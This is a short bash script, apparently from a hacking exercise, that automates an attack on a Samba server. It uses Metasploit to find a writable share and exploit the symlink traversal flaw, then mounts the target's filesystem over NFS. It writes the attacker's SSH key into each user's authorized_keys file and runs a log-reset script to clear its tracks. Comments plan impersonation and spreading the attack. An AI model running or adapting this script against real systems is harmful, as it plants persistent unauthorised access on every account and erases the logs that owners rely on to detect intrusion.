#!/bin/bash
#this shell is used to get the writable share and exploitation of that share using symlink vulnerability
rm msfoutput.txt
rm smbwritableshare.txt
rm users.txt
args=("$@")
msfconsole -x "use  auxiliary/scanner/smb/smb_enumshares ; set RHOSTS ${args[0]}; exploit ;exit ">> msfoutput.txt
cat msfoutput.txt | grep tmp |cut -d "-" -f 2  | while read p
do
    if [ $p = "tmp" ]
    then
      $(echo "tmp" >> smbwritableshare.txt)
      echo "Exploiting symlink"
      msfconsole -x "use auxiliary/admin/smb/samba_symlink_traversal;set RHOST ${args[0]};set SMBSHARE $p;exploit;exit"
      echo "Exploited"
      echo "Mounting NFS to our /tmp/mount "
      mkdir /tmp/mount
      mount -t nfs -o nolock ${args[0]}:/tmp/rootfs /tmp/mount/
      cat /root/.ssh/id_rsa.pub >> /tmp/mount/home/${args[1]}/.ssh/authorized_keys
      ls /tmp/mount/home/ >> /var/www/html/start/hackathon/setup/users.txt
      #todo
      #user impersonation
      #malicious activity
      #spreading attack
      #clear tracks
      cat users.txt | while read p
        do
          cat /root/.ssh/id_rsa.pub >> /tmp/mount/home/$p/.ssh/authorized_keys
           echo "Can impersonate user "$p
        done
        echo "Clearing tracks "
        cd /tmp/mount/root/ ; ./reset_logs.sh
        echo "Done clearing tracks"
    else
      echo " not hacked!!"
      $(echo " " >> smbwritableshare.txt)
    fi
done

#${args[1]} will be the userid 